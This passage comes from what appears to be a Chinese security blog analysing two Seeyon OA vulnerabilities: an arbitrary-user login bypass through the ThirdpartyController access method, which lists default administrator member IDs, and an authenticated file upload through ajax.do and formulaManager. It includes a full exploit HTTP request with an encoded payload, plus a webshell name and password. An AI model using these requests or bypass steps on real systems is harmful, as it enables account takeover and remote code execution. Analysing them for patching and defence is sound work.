访问/seeyon/online.do接口进行验证。\nGET /seeyon/online.do?method=showOnlineUser HTTP/1.1Host: 192.168.0.103Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=8C078E76C97C408221F7CD808AF28932; loginPageURL=; avatarImageUrl=-7273032013234748168Connection: close\n\n\n\n\n\n\n\n\n可用该JSESSIONID访问需要登录的接口，配合后台一些RCE漏洞进行利用。\n漏洞分析在源码中全局搜索thirdpartyController 关键字\n\n\n\n\n\n\n\n可以根据路由接口找到对应配置文件中类文件的映射，跟入到com.seeyon.ctp.portal.sso.thirdpartyintegration.controller.ThirdpartyController中。\n根据exp可以得知调用了该类的access方法。\n在这个方法中代码还是比较多，我做了一些简化，保留了关键的几个代码片段。\npublic ModelAndView access(HttpServletRequest request, HttpServletResponse response) throws Exception &#123;        ModelAndView mv = new ModelAndView(\"thirdparty/thirdpartyAccess\");        String enc = null;        if (request.getParameter(\"enc\") != null) &#123;            enc = LightWeightEncoder.decodeString(request.getParameter(\"enc\").replaceAll(\" \", \"+\"));        &#125; else &#123;            String transcode = URLDecoder.decode(request.getQueryString().split(\"enc=\")[1]);            enc = request.getQueryString().indexOf(\"enc=\") &gt; 0 ? LightWeightEncoder.decodeString(transcode) : null;        &#125;        if (enc == null) &#123;            mv.addObject(\"ExceptionKey\", \"mail.read.alert.wuxiao\");            return mv;        &#125; else &#123;            Map&lt;String, String&gt; encMap = new HashMap();            String[] enc0 = enc.split(\"[&amp;]\");            String[] link = enc0;            int var14 = enc0.length;            String path;            String startTimeStr;            for(int var15 = 0; var15 &lt; var14; ++var15) &#123;                String enc1 = link[var15];                String[] enc2 = enc1.split(\"[=]\");                if (enc2 != null) &#123;                    path = enc2[0];                    startTimeStr = enc2.length == 2 ? enc2[1] : null;                    if (null != startTimeStr) &#123;                        startTimeStr = URLEncoder.encode(startTimeStr);                        startTimeStr = startTimeStr.replaceAll(\"%3F\", \"\");                        startTimeStr = URLDecoder.decode(startTimeStr);                    &#125;                    encMap.put(path, startTimeStr);                &#125;            &#125;            link = null;            long memberId = -1L;            Constants.login_useragent_from userAgentFrom = login_useragent_from.pc;            String linkType = (String)encMap.get(\"L\");            path = (String)encMap.get(\"P\");            Long timeStamp;            String link;            if (Strings.isNotBlank(linkType)) &#123;                startTimeStr = \"0\";                if (encMap.containsKey(\"T\")) &#123;                    startTimeStr = (String)encMap.get(\"T\");                    startTimeStr = startTimeStr.trim();                &#125;                timeStamp = 0L;                if (NumberUtils.isNumber(startTimeStr)) &#123;                    timeStamp = Long.parseLong(startTimeStr);                &#125;                if ((System.currentTimeMillis() - timeStamp) / 1000L &gt; (long)(this.messageMailManager.getContentLinkValidity() * 60 * 60)) &#123;                    mv.addObject(\"ExceptionKey\", \"mail.read.alert.guoqi\");                    return mv;                &#125;                String _memberId = (String)encMap.get(\"M\");                if (_memberId == null) &#123;                    mv.addObject(\"ExceptionKey\", \"mail.read.alert.wuxiao\");                    return mv;                &#125;                memberId = Long.parseLong(_memberId);                link = (String)UserMessageUtil.getMessageLinkType().get(linkType);                if (link == null) &#123;                    mv.addObject(\"ExceptionKey\", \"mail.read.alert.wuxiao\");                    return mv;                &#125;                            &#125; else &#123;                            if (memberId == -1L) &#123;                mv.addObject(\"ExceptionKey\", \"mail.read.alert.noUser\");                return mv;            &#125; else &#123;                boolean isNeedLogout = false;                long time2 = System.currentTimeMillis();                log.info(\"Param耗时\" + (time2 - time1) + \"MS\");                User currentUser = (User)session.getAttribute(\"com.seeyon.current_user\");                if (currentUser != null &amp;&amp; !currentUser.isDefaultGuest()) &#123;                    if (currentUser.getId() != memberId) &#123;                        mv.addObject(\"ExceptionKey\", \"mail.read.alert.exists\");                        return mv;                    &#125;                &#125; else &#123;                    V3xOrgMember member = this.orgManager.getMemberById(memberId);                    if (member == null) &#123;                        mv.addObject(\"ExceptionKey\", \"mail.read.alert.noUser\");                        return mv;                    &#125;                    LocaleContext.setLocale(session, this.orgManagerDirect.getMemberLocaleById(member.getId()));                    currentUser = new User();                    currentUser.setLoginTimestamp(loginTime);                    session.setAttribute(\"com.seeyon.current_user\", currentUser);                    AppContext.putThreadContext(\"SESSION_CONTEXT_USERINFO_KEY\", currentUser);                    AppContext.initSystemEnvironmentContext(request, response, true);                    currentUser.setSecurityKey(UUIDLong.longUUID());                    currentUser.setId(memberId);                    currentUser.setName(member.getName());                    currentUser.setLoginName(member.getLoginName());                    currentUser.setAccountId(member.getOrgAccountId());                    currentUser.setLoginAccount(member.getOrgAccountId());                    currentUser.setDepartmentId(member.getOrgDepartmentId());                    currentUser.setLevelId(member.getOrgLevelId());                    currentUser.setPostId(member.getOrgPostId());                    currentUser.setInternal(member.getIsInternal());                    currentUser.setUserAgentFrom(userAgentFrom.name());                    currentUser.setSessionId(session.getId());                    currentUser.setRemoteAddr(Strings.getRemoteAddr(request));                    currentUser.setLocale(locale);                    BrowserEnum browser = BrowserEnum.valueOf(request);                .... 忽略了                return mv;            &#125;        &#125;    &#125;\n\n\n\n\n\n\n\n\n首先，在代码的276行处，接收了enc参数并使用LightWeightEncoder.decodeString进行解码，跟入到该方法中。\npublic static String decodeString(String encodeString) &#123;        if (encodeString == null) &#123;            return null;        &#125; else &#123;            try &#123;                encodeString = new String((new Base64()).decode(encodeString.getBytes()));            &#125; catch (Exception var3) &#123;                log.warn(var3.getMessage());            &#125;            char[] encodeStringCharArray = encodeString.toCharArray();            for(int i = 0; i &lt; encodeStringCharArray.length; ++i) &#123;                --encodeStringCharArray[i];            &#125;            return new String(encodeStringCharArray);        &#125;    &#125;\n\n这个方法功能是对传入的字符串进行base64解码，然后再将解码后的字符串每一个字符向后移动一位。\n如传入bcd-&gt;base64编码-&gt;调用decodeString-&gt;abc。\n\n\n\n\n\n\n\n很简单，接下来往下面看。\n在286-307行处\n\n\n\n\n\n\n\n这段代码是对经过经过decodeString解码后的值做一个分割操作，首先是将enc的值通过&amp;分割成一个字符串列表，然后再进行遍历，再根据=再次分割字符串，将=前的值作为key放入encMap中，=后面的作为key的值 。如test=1&amp;test2=2&amp;test3=3，就会被拆成{&quot;test&quot;: 1，&quot;test2&quot;: 2, &quot;test3&quot;: 3}。\n再往下边看。\nConstants.login_useragent_from userAgentFrom = login_useragent_from.pc;           String linkType = (String)encMap.get(\"L\");           path = (String)encMap.get(\"P\");           Long timeStamp;           String link;           if (Strings.isNotBlank(linkType)) &#123;               startTimeStr = \"0\";               if (encMap.containsKey(\"T\")) &#123;                   startTimeStr = (String)encMap.get(\"T\");                   startTimeStr = startTimeStr.trim();               &#125;               timeStamp = 0L;               if (NumberUtils.isNumber(startTimeStr)) &#123;                   timeStamp = Long.parseLong(startTimeStr);               &#125;               if ((System.currentTimeMillis() - timeStamp) / 1000L &gt; (long)(this.messageMailManager.getContentLinkValidity() * 60 * 60)) &#123;                   mv.addObject(\"ExceptionKey\", \"mail.read.alert.guoqi\");                   return mv;               &#125;               String _memberId = (String)encMap.get(\"M\");               if (_memberId == null) &#123;                   mv.addObject(\"ExceptionKey\", \"mail.read.alert.wuxiao\");                   return mv;               &#125;               memberId = Long.parseLong(_memberId);               link = (String)UserMessageUtil.getMessageLinkType().get(linkType);               if (link == null) &#123;                   mv.addObject(\"ExceptionKey\", \"mail.read.alert.wuxiao\");                   return mv;               &#125;\n\n上面这段代码是从encMap中根据键L、P、T、M拿到对应的值分别赋值给linkType、path、startTimeStr、_memberId。\n其中linkType、startTimeStr、_memberId所获取到的值很关键，也很重要。\n在316-344行处\n\n\n\n\n\n\n\n这里之所以要进入这个if语句体中，是因为需要执行333这条语句，从encMap中获取到_memberId的值，后这个值将会有很大的作用。\n在执行在拿到_memberId值之前，先是判断当前的时间是否大于了指定的时间，如果是直接返回了，很显然，我们肯定不想直接返回。\nif ((System.currentTimeMillis() - timeStamp) / 1000L &gt; (long)(this.messageMailManager.getContentLinkValidity() * 60 * 60)) &#123;    mv.addObject(\"ExceptionKey\", \"mail.read.alert.guoqi\");    return mv;&#125;\n\n这里的stimeStamp直接可控，所以可以直接传入一个很大的值，可以传入一个跟System.currentTimeMillis()获取到的一样的值，这个条件不成立就不会进入。然后就会在encMap中拿到_memberId的值。\n最后\nlink = (String)UserMessageUtil.getMessageLinkType().get(linkType);\tif (link == null) &#123;        mv.addObject(\"ExceptionKey\", \"mail.read.alert.wuxiao\");        return mv;&#125;\n\n这里也是一个很关键的地方，如果link的值为空，那么会直接返回，所以这里必须通过linkType拿到点什么。\n先跟入getMessageLinkType方法中。\n\n\n\n\n\n\n\n调用了userMessageManager.getMessageLinkTypes()获取值，继续跟入\n\n\n\n\n\n\n\n找到对应的实现类。\n\n\n\n\n\n\n\n继续跟入\n\n\n\n\n\n\n\n发现直接返回了messageLinkTypes，接下来在这个类中看看哪儿给messageLinkTypes传入了参数。\n\n\n\n\n\n\n\n在129-136行处，加载了/base/message-link.properties配置文件，然后把值赋put进messageLinkTypes中。\n在message-link.properties文件中\n\n\n\n\n\n\n\n随便挑一个给linkType赋值就可以绕过最后一个条件。\n接下来就来到最关键的一步\n\n\n\n\n\n\n\n这段代码通过我们拿到的memberId作为参数调用了this.orgManager.getMemberById，这个方法大致就是通过memberId查找对应的用户，从别的师傅文章中得知，致远中存在几个默认的用户。\n&quot;5725175934914479521&quot;   &quot;集团管理员&quot;&quot;-7273032013234748168&quot;  &quot;系统管理员&quot;&quot;-7273032013234748798&quot;  &quot;系统监控&quot;&quot;-4401606663639775639&quot;  &quot;审计管理员&quot;\n\n我们只需要通过以上memberId就能查询出管理员用户信息，在422行，用新创建的User对象重新设置了session，并且将查询出来的用户信息设置到了currentUser对象中，这才导致了任意用户登录漏洞。\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"致远OA A8.0 SP2 Ajax.do调用formulaManager任意文件上传漏洞分析","url":"/2023/08/07/%E8%87%B4%E8%BF%9COA%20A8.0%20SP2%20Ajax.do%E8%B0%83%E7%94%A8formulaManager%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"致远OA A8.0 SP2 Ajax.do调用formulaManager任意文件上传漏洞分析漏洞环境致远A8.0 SP2 （需要登录）\n漏洞复现POST /seeyon/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1Host: 10.0.103.5Content-Length: 5657RequestType: AJAXUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36Content-Type: application/x-www-form-urlencoded;charset=UTF-8Accept: */*Origin: http://10.0.103.5Referer: http://10.0.103.5/seeyon/main.do?method=managementMainAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=3FFCCA305397F064185937C04ACAB9CF; hostname=10.0.103.5:80; loginPageURL=; login_locale=zh_CNx-forwarded-for: 127.0.0.1Connection: closemanagerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00mV%5Bs%C2%A2J%10%C3%BE%2B%29%C2%9E%C2%92%C3%9A%1C%17Qv%C3%97%C2%A4%C3%B6A%C2%88%22%C2%A8%24%02r%C2%99%C2%93%C3%B3%C3%80e%04d%40%C3%82E%C3%85T%C3%BE%C3%BBi%40%C2%8D%C2%B1%C3%B2%40%C3%A9%C3%B4%C3%B4%C3%B5%C2%9B%C2%AF%7B%C3%A6%C3%9Fw*%C3%B4%C2%A8%C2%87%C2%A4%24%C3%A4%C2%9EZm%C2%B2%C2%B8%24%C2%B6V%C2%A5%C2%98z%60%C3%8E%C3%AB%21%09%C3%AD%C3%BCJG%C2%B6c%C3%90%C2%A1%0A%C2%9C%17%C3%94%3D%C3%A5%C3%A1%C3%9C%C3%8D%C3%82%C2%B4%087%C3%89I%2F%C2%B53%3B%C3%8E%C2%A5%C3%BCZrZ%C2%B9v%C2%81%C3%BDMV%C2%9D%C3%96%05%C2%8ES%02%C2%B2%C2%B3Bn%C2%83%00_%C2%85%1D%C3%AD%C3%93%0C%C3%A7y%13%07%C2%A2%C2%AEnV%21%C3%81%2Fv%11%C3%9C%C3%BC%C2%BDy%C2%A5%3A%C2%9D%C2%9F%3B%C3%AC%C3%98i%C2%9A%C3%BFT%C2%9E%C2%9F%C2%B5%C2%9F%C3%B1%21c%3A%C3%AB%3C%7D%C2%A5%1E%C3%97%C3%B6%C3%96%C3%AE%C2%84%C2%9B%C3%8E%18%C3%B4%1B%230H%C3%B0%C3%AE%C3%A6R%7E%7Brv%C3%B7%C2%A8%16Y%C2%98%C3%B87y%C2%80%09%C3%B9%C3%BBJ%C2%BD%C3%B0%C3%BA%C3%90%15%C3%86%09R%C2%B9%C3%941%C2%B9%C2%AD%C2%9B%2C%06b%C2%9C%06%5E%3C*%3DSI%1D%C2%BE%C3%BF6%13%C3%9A%C2%B5m%C3%BC%29%C2%A7%C3%A1%C3%BE%C3%8D2Q%C2%80yv%C3%AD%26d%C3%A7%09%C3%9F%C3%8B%C3%9C%1EG%C2%AC%C2%AA%C3%BF%26%C2%86%C3%8B%1F%2F%C3%BC2%C2%B0%C2%98%7D%C3%A0%C3%B6%C3%A6%C2%BE%C2%AEr%04O%14%C3%A2%C3%84%C3%8AA%1C%C3%89%C2%B9e%C3%8A%07M%18%04H%C3%90%2Bq%C2%92O%C3%B9%05%C3%91%C2%A7%C3%97ra%C2%9E%C2%B6%7B%C2%91%C3%A4%C3%B6%C3%B4%1D2%C3%85%C2%8DUE%C2%BFy%3F%C2%92V%C2%8B%C2%8D%C3%84%C2%9B%5C%C3%97%C2%8A%C3%B7%C2%A9UqO%C2%8E0%3E%C2%B8%15%C2%97L%05%C2%89%C3%B5%04%C3%9D1U.%C2%9C%C2%AA%5C%C2%A3%C3%8B%C2%9B%12%C3%B1%26z%C3%A5%C2%84%C3%9C%C3%8139%C3%A2%C2%86l%C2%84%0C%C2%94%3A%C2%B1%7E%C2%B4%0B%C3%82%19%3F%C3%9C%C3%8Dx.%C2%9C%C3%85%7B%C3%88%C3%91%C2%A3m%C3%BE3%C3%8EJ%5D%C3%BE%C3%A0%C3%97%3B%C3%82%27J%C2%85%C3%8D%26W%C3%8D%C2%9BH%60%C3%AF%C3%BA6%C2%A3%C2%B3%2F%C2%AA%C3%88%C3%8E%C2%9F%C2%B8%C3%90%3A%C3%B8%7D%C3%99X%C3%B4dmy%C2%98%1F%C3%9C%C2%AE%C2%B8nt%2Bd%C2%8E%C2%BB%C3%88%C2%94%C3%A9Y%22%13o4%C2%A6k%5B%2B%C3%91i%C2%A4%C3%BA%C2%A1%C3%8B%14%C2%AC%18%C3%AE%1A%3FS%C3%AD%C2%ABo%24%C2%8CiK%C3%AB%7E%C3%9A%C3%87%1E%C3%B1%C3%86%12%C2%B1%0C%05j%C3%B0%C3%93Y%C3%92%C3%BC%C2%9F%C3%9B%06K%C2%A6%C3%87%7Cm%C3%83%C3%B2%C2%A7%C2%82%12x%C3%82%28xQ%C2%B9%C3%923%C3%B6%C3%B9%19%07%5D%C2%A6%C3%9D%C2%98%C2%94%C2%A8%C3%A2%18%C3%80%C3%92%C2%87%7D%0D%C2%83_d%C3%90%25btz9%C2%91%C2%B6.%C3%A0%C3%AEM%C2%A2%C3%8D%C2%99%0B%C2%B1%5E%C2%B9%0C%C3%99%3A%C2%A1%C2%98%3E%C3%AF%00%C3%B3%05%09%C2%B1%C2%A9%10%C2%A3K%C3%BB%163%C2%88%C2%90%C3%96mb%C3%94%7B%22%3F%C3%B4%C3%9B%C2%8FKQ8%C3%9C%C3%94%C2%B6%C2%B3X%C3%9E%02%C2%BF%027%C3%96%C2%97N%C3%A5%C2%87s%C2%B5%C3%9F%17%C3%83%C3%88%7FY%C3%93%C3%BE%C2%9C%C2%8F%7C%C3%BC%C3%85%C2%AE%C3%BD%16G%C3%8E%2C%C3%A2%C3%B1%01i%16-%3E%C3%91%27Y%C2%89%C3%A2A%C2%A5%C3%85%C3%A3%C2%A2%C3%86%C3%8E%C2%8E%C3%87%C2%8C%C2%A5%C2%B2%5DO+%C3%B9%2C%C2%92%02%C2%97Y22%C3%9F%C3%A6y%C3%ADSc%C2%A47d%C3%88%C2%B48RH%C2%93w%5B%3F%0F%7C%23%C3%B2z%C3%91%C3%94%C2%AF%19%3Am%0B%C2%83h%C3%8AK%092%C2%95%11%C3%A8o%1B%1E%C3%82%C3%B9%C2%9C%C2%B8%09u%C2%A7%C2%A2%C3%80v%1Da%C2%97%C3%8E%00K%2F%1EdH%0DN%7Er%C2%91%0F%5E%2Chs%C2%AB%C2%A7%00%07%23%C3%9FI%C3%B4%C3%9Ci%C3%8F%C3%86%C3%BF%C2%9A%13%C2%B7v%18%C2%85%C3%94%C2%B5%7Dr6%C3%B2%15Ao%C3%A4%C3%80%C3%91%3A%C2%87%23%3F%C3%A1%C2%AC%C3%AB%C2%B3%1Fu%C2%89%27%04%5B%C3%84%C3%BB%21%3A%C3%AA%C3%95%C2%B9%01%C2%8F%7B%C3%A29%C2%BF%C3%AEo%2B%214%C3%92%0B%0F%C2%B0od%2B5%C2%82%1Ef%19%C2%87%29%C3%88%C3%B4%C2%B3%C3%BE%1C%C3%AA+%5E%C3%85%7D%C3%A6k%16%C2%91e*A%1B%C2%AB%C3%89%C3%A9%00X%C3%A8%C3%BA%C3%88*%C2%9E%01W%C3%B0%C3%B3%C2%B5%C2%8E%09%C3%AD%23c%7F%40-%C2%BF%C2%AE%C3%AB%3B%C3%B5%C3%A4%09%C2%9B%1A%C3%AF%C2%A3%C2%8C%C2%8D%C2%9D%C2%9E%C3%B4l%19%5D%C3%A0%C2%ADt%C3%B0%C2%8C%7E%C3%A9%18%C3%A4%60U%2C%C2%BF%C3%90%C3%A5%C2%B1%C2%BC%C2%BE%C3%84%C3%BE%5B%C3%AC%C2%8E9%2F.%C3%B0%1A%0E%C3%84%C3%91%C2%89%03l%C2%89LOr%12%C2%99%C2%B6%0Cv%0D%5C%C3%B9%C2%96%13%0D%0E*%C3%98%C3%B1%C3%81%C2%89%C3%93%C3%A9%05%3F%1AN%1Cy%C2%B7%C2%99%C2%AA%C3%8Dy%C3%88%C3%B0m%1Cf%01%C3%BDq%C3%94%5BJ%5D%14%23%C2%88%7F%C3%86%C2%B3%C2%AD%C2%B1%5Bx%C2%B8%7B%C3%AA7v%C3%9D%C3%88z%C3%B4%25g%C3%8E5%C3%82%C3%9C%C2%81%7C%C3%9D3G%C3%AB3lz%C3%9F%C2%A4%C2%AF%C3%B2%C3%A6%06M%1F%2F%C3%A5%C3%94%15%02%C2%88%C3%89%C2%AD%C3%9B%C3%9E+%3B%C2%BB%C3%B6%C3%93%C2%9C%1B%C2%81%19%C2%AC%04N%2C%C3%97%C3%98r%C2%8A%3E%0F%C3%9B%C2%B9%12I%C2%80%2F%C3%8C%15BO%C2%9F%C3%8E%C2%B9j%10%0F%C3%A6%C2%8B2C%26%C3%91%C2%A0%C3%B7%C3%97S%C2%A1+%C2%B8%C2%AD%C2%95%C2%AF1i%C2%B8%C3%87%0F%C3%83%C3%85R%C3%97%C3%A0%2CN3%C2%A0%C3%89WW%03%C3%A8%17rh%C3%A3%C2%B6%5C%C2%839t%C2%81%C2%9B%3Cw%C2%98q%C2%8D%25%C3%A0%07%C3%B2*X%C3%8Fbe%C2%AB%00%06%C2%96%C2%B1%C3%9B%C2%B4%C3%B8G%C2%80%09%C3%A4B_%C3%A6%0D%C2%BA0%C3%B3%2C%C3%A0%C3%96t%C3%82%05%C3%A0%C3%AF%C3%89aX%1A%C2%99%01%7D%C2%9C%C2%91%C2%80%03%19X%0C%60%C3%84%C3%B8%1B%C3%85%0C%C3%96%C3%88%C3%A4h%C3%9B%18%C2%94%C2%A2%C2%B0L%C3%B1.%1D%3C%C3%AF%C3%92%C2%ADg.%06%C3%8D%1D%C2%B7%C2%84%19%C2%94%28p%C3%BF%2CJw%C2%A2%1F%C3%AC%C2%91%C2%B4E0%C3%A3j_%C2%92%C3%96%C2%87%C3%9B%C3%B01%2F%C2%93N%1C%C3%A6n%C2%87%1B%C2%AA%C2%A3_%C3%BD%27%C3%ACn%3C%C2%9C%C3%9Dx%C3%87%C3%9F%C3%B6f%C3%BD%5E%C3%A9%C3%B6%7C%C2%B7%C2%B6%C3%9A%C3%87Ek%C3%92.n%C2%8F%7E%3A%C3%AD%2FW%C2%AEV%60%C3%97%5C%C3%85w%C3%B7%C2%AF%C3%94R%1B%C3%BF%C3%B3%C3%A7%C2%95%C2%BA%7B%C2%ACo%C3%AB%C3%8E.%0B%0B%7C%7B%C3%A9%C3%AB%C3%AE%C3%B1%C3%A3%C2%B1%7E%C2%96%40%C2%A4%C3%BA%C2%81%C2%90%17v%11%C2%BA7%C3%BB%C3%BD%C3%BE%C3%B6%C3%AE%1D%C2%9E*x%C2%9Fb%C2%B7%C3%90mR%C2%9E%C3%9F%16%C2%9E%5D%1C%C3%9F%3C%C3%87%C2%97%07%C2%98%C2%9C%17n%C2%86%C3%ADb%C2%93%7DYb-%C2%8C%C3%8F%0Ae%C3%AA%5DI2%0C%09%C3%A3%C3%84%C3%85%C3%A2%C3%B9e%05%C3%95Q%0FEV%C3%A2%3A%C2%81%22%C2%B3%C3%A7vJ%3D%C2%BC%7F%7C%C3%9CS%C3%94%C3%BD%C3%BB%C3%87%7D%C2%BD%C3%B3%C3%9F%C3%BFp%C2%A5%C2%92D%C2%8B%09%00%00\n\n\n\n\n\n\n\n\n天蝎连接 http://10.0.103.5/mzr2.jsp sky\n\n\n\n\n\n\n\n漏洞分析通过EXP可以知道请求了ajax.do这个路由，全局搜索ajax.do找到映射的类\n\n\n\n\n\n\n\n跟入到com.seeyon.ctp.common.service.AjaxController类中，从请求参数method=ajaxAction可以知道调用了AjaxController的ajaxAction方法，接下来分析ajaxAction方法。\npublic ModelAndView ajaxAction(HttpServletRequest request, HttpServletResponse response) throws Exception &#123;        response.setHeader(\"Pragma\", \"No-cache\");        response.setHeader(\"Cache-Control\", \"no-cache\");        response.setDateHeader(\"Expires\", 0L);        response.setContentType(\"application/json; charset=UTF-8\");        String responseCompress = request.getParameter(\"responseCompress\");        String url = request.getRequestURI();        String outStr = \"\";        outStr = this.invokeService(request, response);        if (Strings.isNotBlank(request.getParameter(\"ClientRequestPath\"))) &#123;            outStr = ZipUtil.compressResponse(outStr, responseCompress, \"UTF-8\", LOGGER);            outStr = Strings.toHTML(outStr);        &#125;        Writer out = response.getWriter();        out.write(outStr);        return null;    &#125;\n\n这个方法主要作用是接收一个responseCompress，这个参数作用是用于compressResponse压缩的方式，然后调用this.invokeService方法，在不传入ClientRequestPath参数的情况下，对得到的结果进行压缩并返回到前端。\n跟入this.invokeService中。\nprivate String invokeService(HttpServletRequest request, HttpServletResponse response) throws BusinessException &#123;        AppContext.initSystemEnvironmentContext(request, response, false);        String serviceName = request.getParameter(\"managerName\");        String methodName = request.getParameter(\"managerMethod\");        String strArgs = request.getParameter(\"arguments\");        String compressType = request.getParameter(\"requestCompress\");        strArgs = ZipUtil.uncompressRequest(strArgs, compressType, \"UTF-8\", LOGGER);        String ctpJSONPCallback = request.getParameter(\"ctpJSONPCallback\");        String retValue = null;        JSONValue jsonValue = null;        try &#123;            long start = System.currentTimeMillis();            Object service = getService(Strings.escapeJavascript(serviceName));            Object result;            try &#123;                result = this.invokeMethod(service, methodName, strArgs, serviceName);            &#125; catch (Exception var20) &#123;                this.logger.error(\"ajax error,serviceName=\" + serviceName + \",methodName=\" + methodName + \", strArgs=\" + JSONUtil.toJSONString(strArgs), var20);                throw var20;            &#125;\t\t\t// 忽略了        return retValue;    &#125;\n\ninvokeService方法中首先从request中接收了serviceName、methodName、strArgs、compressType等参数。调用了ZipUtil.uncompressRequest对strArgs进行解压缩，解压缩的格式为传入的compressType。\n接着用serviceName作为参数调用了getService方法，跟入到getService方法中\nprivate static Object getService(String serviceName) throws Exception &#123;        Object service = AppContext.getBean(serviceName);        if (service instanceof DataSource || service instanceof Session || service instanceof SessionFactory) &#123;            service = null;        &#125;        if (service == null) &#123;            Exception e = new Exception(\"can not find the service: \" + serviceName);            throw e;        &#125; else &#123;            return service;        &#125;    &#125;\n\n这个方法作用就是根据serviceName获取到对应类的已经创建好的实例，但是不能随便获取,必须是已经在配置文件中注册过的才能获取到。大概有八百多个都可以直接调用，但所包含的类中的父类及以上类不能是DataSource、Session、SessionFactory三个类。\n\n\n\n\n\n\n\n请求体传入的为managerName=formulaManager，所获取到的对象就为formulaManager类的实例。\n接着返回到invokeService方法中。\n在122行\n\n\n\n\n\n\n\n调用了this.invokeMethod(service, methodName, strArgs, serviceName)，从方法名大概就猜得到到反射调用了service类的methodName方法。\n跟入this.invokeMethod\nprivate Object invokeMethod(Object service, String methodName, String strArgs, String serviceName) throws Exception &#123;        Object result = null;        if (strArgs == null || \"\".equals(strArgs) || \"undefined\".equals(strArgs)) &#123;            strArgs = \"[]\";        &#125;\t\t// json 转 object        Object obj = JSONUtil.parseJSONString(strArgs);        Object l;    \t// 判断obj是否为List子类        if (obj instanceof List) &#123;            l = (List)obj;        &#125; else &#123;            l = new ArrayList();            ((List)l).add(obj);        &#125;        int argsNum = ((List)l).size();        Map data = null;        String key = serviceName + \"_\" + methodName + \"_\" + argsNum;    \t// 根据serviceName_methodName_argsNum为键名获取方法的缓存        List&lt;MethodCache&gt; list = (List)this.candidateMethodCache.get(key);        boolean isFromCache = true;    \t// 如果获取到缓存  将传入的参数list和获取到的方法列表作为参数调用findMethodAndArgs        if (list != null) &#123;            //             data = this.findMethodAndArgs((List)l, (List)list);        &#125;        if (data == null || data.size() == 0) &#123;            isFromCache = false;            data = this.findMethodAndArgs((List)l, this.judgeCandidate(service, methodName, argsNum));        &#125;        if (data != null &amp;&amp; data.size() &gt; 0) &#123;            Method target = (Method)data.get(\"method\");            final Object[] args = (Object[])((Object[])data.get(\"args\"));            if (target != null) &#123;                try &#123;                    if (logAjax.isDebugEnabled()) &#123;                        User user = AppContext.getCurrentUser();                        logAjax.debug(serviceName + \",\" + methodName + \",\" + this.hasMemberId(args) + \",\" + user.isAdministrator() + \",\" + user.isAuditAdmin() + \",\" + user.isSystemAdmin() + \",\" + user.isGroupAdmin() + \",\" + AppContext.currentUserLoginName() + \",\" + strArgs);                    &#125;                &#125; catch (Exception var19) &#123;                &#125;                if (list == null) &#123;                    list = new ArrayList();                    this.candidateMethodCache.put(key, list);                &#125;                if (!isFromCache) &#123;                    ((List)list).add(new MethodCache(target));                &#125;\t\t\t\t// 反射调用方法                result = target.invoke(service, args);                CTPRequestContext context = (CTPRequestContext)AppContext.getThreadContext(\"CTPHandlerInterceptor.context\");                Class clazz = AopProxyUtils.ultimateTargetClass(service);                if (AspectManager.withParameters(clazz, methodName)) &#123;                    final HashMap map;                    if (context != null) &#123;                        map = new HashMap(context.getRequest().getParameterMap());                    &#125; else &#123;                        map = new HashMap();                    &#125;                    AspectContext ctx = new AbstractAspectContext(AspectManager.getSourceName(clazz, methodName), SourceType.Ajax, AppContext.getCurrentUser()) &#123;                        private Object[] arguments = args;                        public Object getParameter(String name) &#123;                            return map.get(name);                        &#125;                        public Object getParameter(int index) &#123;                            return this.arguments[index];                        &#125;                    &#125;;                    AspectManager.initContext(ctx);                &#125;                AspectManager.execute(clazz, methodName);                return result;            &#125;        &#125;        String errStr = \"can not find the method [\" + methodName + \"], which has \" + argsNum + \" arguments.\";        NoSuchMethodException ex = new NoSuchMethodException(errStr);        throw ex;    &#125;\n\n这个方法中，首先将传入的strArgs参数解析成了Object对象，接着判断这个对象是否为List子类的实例，是的话会将Object强制转换成List对象，否则就会创建一个ArrayList对象。然后将传入的Object添加到ArrayList中。\n经接着会serviceName + &quot;_&quot; + methodName + &quot;_&quot; + argsNum作为键值在this.candidateMethodCache中获取已经缓存的方法。如果获取到则会将传入的strArgs和调用this.candidateMethodCache.get(key)的返回值作为参数调用this.findMethodAndArgs((List)l, (List)list)。\n如果缓存中没有获取到对应的方法，那么会调用this.judgeCandidate(service, methodName, argsNum)方法反射获取到对应的方法。\n接着，跟入this.findMethodAndArgs方法\nprivate Map findMethodAndArgs(List paramObject, List&lt;MethodCache&gt; candidateMethods) &#123;        Map data = new HashMap();        Method targetMethod = null;        Object[] args = null;        Iterator var6 = candidateMethods.iterator();        while(var6.hasNext()) &#123;            MethodCache cache = (MethodCache)var6.next();            Method method = cache.getMethod();            Class[] argTypes = cache.getParameterTypes();            args = new Object[argTypes.length];            try &#123;                for(int i = 0; i &lt; argTypes.length; ++i) &#123;                    Object param = paramObject.get(i);                    if (String.class.equals(argTypes[i])) &#123;                        args[i] = ObjectUtils.defaultIfNull(param, \"\");                    &#125; else if (Date.class.equals(argTypes[i])) &#123;                        if (param != null) &#123;                            String str = param.toString();                            if (Strings.isDigits(str.substring(0, 1))) &#123;                                str = \"\\\"\" + str + \"\\\"\";                            &#125;                            args[i] = JSONUtil.parseJSONString(str, argTypes[i]);                        &#125; else &#123;                            args[i] = null;                        &#125;                    &#125; else if (Map.class.equals(argTypes[i]) &amp;&amp; param instanceof Map) &#123;                        args[i] = param;                    &#125; else if (param instanceof String &amp;&amp; !String.class.equals(argTypes[i])) &#123;                        args[i] = JSONUtil.parseJSONString(param == null ? null : param.toString(), argTypes[i]);                    &#125; else &#123;                        args[i] = JSONUtil.parseJSONString(param == null ? null : JSONUtil.toJSONString(param), 